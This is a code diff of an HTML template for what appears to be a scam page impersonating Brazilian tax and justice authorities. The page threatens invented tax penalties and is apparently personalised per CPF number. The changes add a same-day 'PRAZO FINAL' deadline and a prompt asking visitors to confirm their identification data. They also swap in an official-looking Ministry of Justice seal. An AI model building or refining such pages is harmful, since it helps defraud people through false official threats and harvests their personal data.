@@ -586,12 +586,6 @@
             width: 60px;
             height: 60px;
             object-fit: contain;
-            opacity: 0;
-            transition: opacity 0.3s ease;
-        }
-        
-        .ministry-seal-img[src] {
-            opacity: 1;
         }
 
         .ministry-text {
@@ -713,6 +707,7 @@
                     uma pendência tributária em sua situação fiscal.
                 </p>
                 <p style="text-align: justify; line-height: 1.4; margin-top: 10px;">
+                    <strong style="color: #721c24;">PRAZO FINAL:</strong> {{ customer.today_date }} é o último dia para regularização. 
                     O não cumprimento desta intimação resultará nas seguintes punições conforme 
                     Instrução Normativa RFB nº 1.888/2019:
                 </p>
@@ -724,6 +719,9 @@
                     <li style="margin-bottom: 5px;"><span style="color: #666; font-size: 18px; margin-right: 8px;">●</span><strong>Impedimento para financiamentos, empréstimos e compras no crédito</strong></li>
                     <li style="margin-bottom: 5px;"><span style="color: #666; font-size: 18px; margin-right: 8px;">●</span><strong>Aplicação de multa automática de até 150%</strong></li>
                 </ul>
+                <p style="margin-top: 12px; font-weight: 600;">
+                    Confirme se os dados abaixo correspondem à sua identificação:
+                </p>
             </div>
         </div>
         <div style="background-color: #f8f9fa; padding: 15px; border-radius: 4px; margin-top: 10px; border-left: 4px solid #0c326f;">
@@ -748,7 +746,7 @@
                 </h3>
                 <h4 style="margin: 0 0 15px 0; font-size: 12px; font-weight: bold; letter-spacing: 0.5px; color: #000;">DOCUMENTO OFICIAL</h4>
                 <div style="width: 70px; height: 70px; margin: 0 auto 12px; display: flex; align-items: center; justify-content: center;">
-                    <img id="brazaoDoc" src="https://royalbrindes.com.br/wp-content/uploads/2021/11/AD-TJ.jpg?v=123456" alt="Brasão do Tribunal de Justiça" style="width: 60px; height: 60px; object-fit: contain; opacity: 0; transition: opacity 0.3s ease;" loading="eager" decoding="sync" onerror="retryImageLoad(this, 'brazao')" onload="imageLoaded(this)">
+                    <img src="https://dspace.mj.gov.br/retrieve/95d2f9b3-76eb-4f34-96a4-c2cd54ac589a" alt="Brasão do Ministério da Justiça" style="width: 60px; height: 60px; object-fit: contain;">
                 </div>
                 <p style="margin: 8px 0; font-size: 13px; line-height: 1.4; color: #333; text-align: justify;">
                     Este documento foi assinado em <strong>{{ customer.today_date }}</strong> e possui 
@@ -989,7 +987,7 @@
                 <!-- Brasão do Ministério da Justiça -->
                 <div class="ministry-seal-container">
                     <div class="ministry-seal">
-                        <img id="brazaoModal" src="https://royalbrindes.com.br/wp-content/uploads/2021/11/AD-TJ.jpg?v=123456" alt="Brasão do Tribunal de Justiça" class="ministry-seal-img" loading="eager" decoding="sync" onerror="retryImageLoad(this, 'brazao')" onload="imageLoaded(this)">
+                        <img src="https://dspace.mj.gov.br/retrieve/95d2f9b3-76eb-4f34-96a4-c2cd54ac589a" alt="Brasão do Ministério da Justiça" class="ministry-seal-img">
                     </div>
                     <div class="ministry-text">
                         <p class="ministry-name">Ministério da Justiça</p>
@@ -1002,75 +1000,8 @@
     </div> <!-- End main-content -->
 
     <script>
-        // Image loading management
-        const imageUrls = {
-            brazao: [
-                'https://royalbrindes.com.br/wp-content/uploads/2021/11/AD-TJ.jpg?v=123456',
-                'https://royalbrindes.com.br/wp-content/uploads/2021/11/AD-TJ.jpg',
-                'https://dspace.mj.gov.br/retrieve/95d2f9b3-76eb-4f34-96a4-c2cd54ac589a',
-                'https://i.ibb.co/QJ9m6VG/brasao-mj.png'
-            ]
-        };
-        
-        let imageRetryCount = {};
-        
-        function retryImageLoad(img, type) {
-            const urls = imageUrls[type];
-            const currentRetry = imageRetryCount[img.id] || 0;
-            
-            if (currentRetry < urls.length - 1) {
-                imageRetryCount[img.id] = currentRetry + 1;
-                console.log(`Tentando carregar imagem ${type} - tentativa ${currentRetry + 2}`);
-                // Add a small delay before retry
-                setTimeout(() => {
-                    img.src = urls[currentRetry + 1];
-                }, 500);
-            } else {
-                console.log(`Falha ao carregar imagem ${type} após todas as tentativas`);
-                // Show a text fallback instead of hiding
-                const textFallback = document.createElement('div');
-                textFallback.style.cssText = 'width: 60px; height: 60px; background: #004488; color: white; display: flex; align-items: center; justify-content: center; border-radius: 50%; font-size: 10px; text-align: center; font-weight: bold; line-height: 1.2;';
-                textFallback.innerHTML = 'MINISTÉRIO<br>DA<br>JUSTIÇA';
-                img.parentNode.appendChild(textFallback);
-                img.style.display = 'none';
-            }
-        }
-        
-        function imageLoaded(img) {
-            console.log(`Imagem carregada com sucesso: ${img.id}`);
-            img.style.opacity = '1';
-        }
-        
-        function preloadImages() {
-            Object.keys(imageUrls).forEach(type => {
-                imageUrls[type].forEach((url, index) => {
-                    if (index <= 1) { // Preload first two URLs
-                        const img = new Image();
-                        img.src = url;
-                    }
-                });
-            });
-        }
-        
-        // Force refresh images on mobile devices
-        function forceImageRefresh() {
-            const images = document.querySelectorAll('#brazaoDoc, #brazaoModal');
-            images.forEach(img => {
-                if (!img.complete || img.naturalHeight === 0) {
-                    const timestamp = new Date().getTime();
-                    const originalSrc = img.src.split('?')[0];
-                    img.src = originalSrc + '?v=' + timestamp;
-                }
-            });
-        }
-        
         // Only show loading screen on CPF routes
         document.addEventListener('DOMContentLoaded', function() {
-            // Preload all images
-            preloadImages();
-            
-            // Force image refresh after 2 seconds for mobile compatibility
-            setTimeout(forceImageRefresh, 2000);
             const currentPath = window.location.pathname;
             const isCpfRoute = /^\/\d{11}$/.test(currentPath); // Matches /11digits
             
